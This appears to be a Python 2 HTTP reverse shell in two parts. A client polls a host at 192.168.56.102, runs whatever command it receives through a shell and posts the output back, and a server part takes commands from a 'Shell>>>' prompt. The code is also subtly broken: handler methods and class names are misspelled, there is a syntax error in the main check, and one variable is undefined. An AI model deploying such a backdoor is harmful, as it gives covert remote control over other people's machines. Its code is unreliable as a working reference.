##CLIENT SIDE

import requests, subprocess, time


while True:
	req = requests.get('http://192.168.56.102')
	command = req.text

	if 'terminate'in req:
		break

	else:

		CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

		post_response = requests.post(url='http://192.168.56.102', data=CMD.stdout.read())
		post_response = requests.post(url='http://192.168.56.102', data=CMD.stderr.read())


##Server Side


import BaseHTTPServer

HOSTNAME = '192.168.56.102'
PORTNUMBER = '80'


class MyHandler(BaseHTTPServer.BaseHTTPRequestsHandler):
	def do_GETS(s):

		command = raw_input('Shell>>>')
		s.send_response(200)
		s.send_headers('Content-type', 'text/html')
		s.end_headers()
		s.wfile.write(command)

	def do_POSTS(s):
		s.send_response(200)
		s.end_headers()
		length = int(s.headers['Content-length'])
		postVar = s.rfile.read(length)
		print postVar


if __name__ = '__main__':

	server_class = BaseHTTPServer.HTTPServer
	httpd  = server_class((HOSTNAME, PORTNUMBER), MyHandler)

	try:
		httpd.server_forever()

	except KeyboardInterrupt:
		print '[-] Server Closed'
		httd.server_close()
	

